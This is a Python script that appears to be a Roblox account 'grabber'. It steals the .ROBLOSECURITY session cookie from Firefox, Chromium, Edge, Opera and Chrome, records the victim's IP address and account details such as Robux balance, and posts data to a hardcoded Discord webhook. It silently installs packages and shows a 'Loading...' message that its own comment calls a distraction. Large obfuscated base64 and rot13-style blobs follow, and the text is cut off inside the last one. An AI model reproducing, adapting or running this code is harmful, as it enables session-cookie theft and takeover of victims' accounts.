import os
import base64, codecs
import json

webhookk = "https://discord.com/api/webhooks/1014659804347772999/yp6ZRmUDH14JiFD4QlvOyUOoLUuVBpUWJ1yB-FxkPkP6yeim7gJw-2DyP6zGva5Em-Ox"

def command(c):
    os.system(c)
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests,re
    from discordwebhook import *
    import browser_cookie3
except:
    command("py -m pip install discordwebhook")
    cls()
    command("py -m pip install robloxpy")
    cls()
    command("py -m pip install requests")
    cls()
    command("pip install discordwebhook")
    cls()
    command("pip install robloxpy")
    cls()
    command("pip install requests")
    cls()
    print("Run the app again.")
    exit()




dummy_message = "Loading..." # A message that distracts the user from closing the grabber
print(dummy_message)
################### Gathering INFOMATION #################################
def cookieLogger():

    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)

    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass


cookies = cookieLogger()


#################### INFOMATION #################
ip_address = requests.get("https://api.ipify.org/").text
roblox_cookie = cookies[1]
#################### checking cookie #############
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    isvalid = "Valid"
else:
    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()

#################### getting info about the cookie #############
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
dnso = None
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
#################### SENDING TO WEBHOOK #################
magic = 'aW1wb3J0IG1hcnNoYWwsIHpsaWIsIGJhc2U2NCwgbHptYQ0KX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMPSdfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTEwnDQpfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTEw9J19fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0FMTF9fTU9OS0VZX1dBTExfX01PTktFWV9XQUxMX19NT05LRVlfV0F'
love = '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'
god = 'tkMXpOO1M0ZE15ZFV8VlhIZlMkUklidSswSGExWGtOPHdSRU8tWGIhUzNgNGdjeGcwblBBaFgtSTgheGFOalhTb049YDsqWUUzazNGSl5qa2FjNT9GUzdrRntWUGI3QllGQmt0RyomV2phJT8kZlJCZHh2Y1VmXm9WPSp7MFdNP0B5YXhYKFFRKmtqI0hFQjYjYllmQ3VEYHNMZVZedzE+VztJMS1ZZ2NHX1BJRn45UiReKiRIJjFke2E4NjdASDhuUnZTWT1nOGRQR1MhWGhkWHJSWXEkXmRVMCRrUiZZdkNjdnlPNk5vWm5GY1RfZV9jMUI/QFhLclJuTHxKVFFaY308JFZReXdPSWFFVXtTVyt+NGI1KENnY3VadzlGa14wTUY7cm5uWmZST2FGSD5UM09uN0tsYnhkUHFid3FQKk1OVT5VTFB1eWdaOFM8YFpnbnp1UzUhbzhiWiN+PWIyRCNHVks3NSRPZm9sNE1gS2YxSWImMzFOSm12bElDKEkzSVojZV5TOSZye2J4fis7YXlDTHZTNz49ZlBqUEs0UGo2SWpiOWlsSlAoXk5aTztMRHBRaDYoSGN5PnhoRzt3KShhI2t5SElCSGliUGRHc19ZO3NwPkZKPzRsWDw5MnxNe2FqIUY/VWluRytLM2NWYHB8WFZNYjk+WmNTITNTN2RFPFlrRnZVWG1DZD5QLXxDM0x9K1I8Ty00QylRQWJLUUcoJH53YXllJSFObCNeSlNZJnU/WWdKTklUMl5CKFctbH19WUJfZl9jdTtNNVpBJm1VSDkxM1lIJUU3Ukx7TCQzYWFjKWZXa3B3R05LIz07WWdUMU1TMmFkQERfMm9OYjkjNGhLfUJfOE1QeFcpUWI8KXZIYUotfVApdWJ4ZFMqKjxTVCE/cUdlYjtJTW0xYDFaQ0V2SllITSQ2R0hmPFlRJS1EUWF4Wkh1YSZCUVZSeVJYNEZJR0BWRmphRihJQ25AYGMwdz4lYjdYTDZIK2YxY01OQlg9WUUob3ZjcnI/NEwxO3lIWUdgQ2djeURsTVg+RTBMRy03TnFhV2dsMVZvLUI8ZDNTbkdGRytXSk09d3R8Tl9JdjxEXmdjeWJ1VE1KTz9QQFJYSHQxfkcpT2x5TWBVSmtQQlMpbFQ1QF9yUzVSMytIISYrQGEhNSNJWG1VbjNPLWU2I1piNDMwT0VGNn1ZaVU/VEZLMjlOR2I9P2xQaUh3Y047UFM4TVBvUXBTVzB0d1dASikhWipnUjlMX3tsTlZtTWJZVDRpQF9GS2MjOVhtQEtrR2dMVEhZZ0lRLWFDU3A9R0FtWCNTdWJsclBIOGgqUEdvcD9jV08mY1Bmc3tQSWROKytIRlpyX1Z7VEdXUWFDVlVWcXtyQ1FndU9FY3hwKmZJNTA5K1ArPkBMYTcxdXZTM15jS01Lb0QhUChAfjhEe0AkUUR7cFhtTWtgcipQZjlPJU18REdhYzNDKUtXPGdtdEdIcG1vTT0odXdObUZ0fkxSdkxxTF98a2VTfk8+N1ZRcTZ0UGM9QTRYZlN0cmNTPWNCU3g4dTlaZ28maVZSJV9OYzR8Z09GSzk3RGRRQl5LTV80cGpGSHwpfEt7SDQtTFVTfXZaOG1DRk5NPUQoYlRvMnVhJlR2MVZgVylIU1ZLKW5EPlEwMVlFM3dFUVo7OCNNYENTS0cpIzNeZFBZfVNUNlJRcFFBY1RMR2V8ajJaKlhOWE1SSXNJSTcoK3xZSFdCK1ElWEBjR0ckalpRQkV+PUhmbSk7RkZ7SCpWc34jWkt+UTk5V15ZJHZSQiVGQUQ9Pkw2WkI4I0BMeyU/WFBBaGp8SUNWSG1EfDlQKFlnanA5UDwzUTBYPk17dk9pRjEoVzs4KXpHPFpXfFpEZERNRF5YIzJMflRrblM1cSkpTi0hJjBNclQ3V0ZsQjI7YlhIa2RGSDFvKlFGJjRgWkIxb3FJNXtoTUZJUCEoTUpybFBNQFVkZkhFVHtWZE17e2tJN1dJJklDRWsrTHV6YlZRQmlzX0RfQmxPRD44YVhPSmBKaFZRQEtrTDNsNF5TfitxPFMzeCNLTl9SPFdHRHROLUxwRjBfY1Y9fSRjUWFLKldsP2kkRjtGeVJJQ2dER1omXm9LUkFfNWRaRFVQJUx9NSE8Ujd6KG5SWUYqOWNXNipoUmU0WnRNPkp8b1lIZFYjVDEwd2hTfVFfd1dpfkB9ZFVRfjZIQXFAK0xOYUQkS35xdDNIY21CZ1kqJGNGSVpafHxiV2xpQ01OVT5rTVBeOERieHRvJFNXO0Z+Rmo3dTRGaGdUUllDfTB+Tk47bXZTOGh2Sk5KPXFLVnJwd3tYSlRfcVktQEgkUGpoSGpIRTM9fWI4am5uWmJ3M0dJZHA0Y0ZHZXpSYlhqVSlPKSpBVFNUe3ZzYTkzNCNTMksxdlNZY1hxY303SkBXQFJ1KkhaZXpKVlAhe1VjNm1XK08tREljZFBIU3NIRml+T0grMz5tR2p+ezZNPmp9U1gtX2F0VktfbHFXbl4kaE49IUxJTF92OU5QKWJLb2NQfmtMYSFPLVFGP3YjV1c9bTAyUGN2OWFjM016WU1gVGV+SCs0LSRheHlEKFdeaHc9Tz0pZyhMXjRadExAenttWkI7QDxQJX5GRldPcXdiZE5XNT9Ncy0/aE9sNUNaYXllPjlNMElqJVElK1E3WG1VbkhTWFhnYlY+dlohVkBmZTxJWWZDX0hiUW85Ung1YTZMfUVAY2QyTTFzYVl7NkpSQjF7Pk1LTWAmVkBFa2lSNjs5Qk49USM7TDNMd2hjeW9Ha04/MnI0Y3U4P2BHST9AVlloeVY/VzxnR1JIZGtSJVIoTUQ8TT45fXNHSF48OGJ9dmtIRm5VSDxOcUleJlhqQz8zUUZ0eyRSeVNCPWFkSnY+Y3xsSkBPPVVRRU5NdSVhVDRfKk1TMmsqUVZzZGd3TytgWGJTVlRmdFhsclJxTm59bE5hV09ANlA8MXMjYzF2YkxIOCg/M1FBMm9HUDxDVC1GKyo9Xkx9cFE5UTleUH1NPXdpU1N5QDcxTk1VK0tXXnpZTU5qWV4rRkhsSHdMdTVAdUR8QT5mUWZmfEFTMjlDKWMzRWd6Rkk3VHhiNlJqfFolfHJWV0BCX2BXO2pHflJaJjxyWmNzOzZObSh+SVo3KWg9Y1hEd15kUCNJT0x9TnJXY1RSSXdUMVI2YEhhS0t3WjhKelNhJnxVeEReRTJgSVlucXhUM0tYcFpGT35ISCtWYG1PKUZ3WGI0eFomR2U+R1FXa0VBSGQwSno2ZFU5bEVQRXNeX1AqUDdaTVArNzBHSUxLZ2NVVztiR2coaHFQZDlvQExSSz9SUzR9SEhWdElPNVc9QmI4UGRSalFIQmYzUmFBIXwlZFBaJCNYRD17dEctaGktUkM2XzFMXk1vSVBnaGVtUWJ8JkVQZ2hTJmN1OTB3SClCVVJhI2RBTVN3d2IyYzVxTk5Ne0h3M1ZRKXVwWExmNWVTI01UM1MjVj1ITE4jd2ZJYSt5Y2N6SmJtVDRaQmxifnNCPEwzVkY8SCkkX3BYKS1mIUcrOXd0UStIWjNPbXN3SVpiZWYkVnQ3KHhjUG0rQ0t+enxBTzxIcU1QZ3Foa0YpdWt6Ulk3eGZOajU4RVIjc3xkTUx8ejFQQkF4N2RNaSQyWUdoPGJhWmg3MmFaWWJVUmI/XyNPbX14TEk3bmkzTVBZWSZJOTc1O2MzTXdTWGtsdGZiMy0+K09MU1VjUiZoO1BSJllkU1pGZV9ST2Zxc1lYLTh7ZUk1PVdBUSlFPGVPSnklSFpCQXgqRksyUmJhZ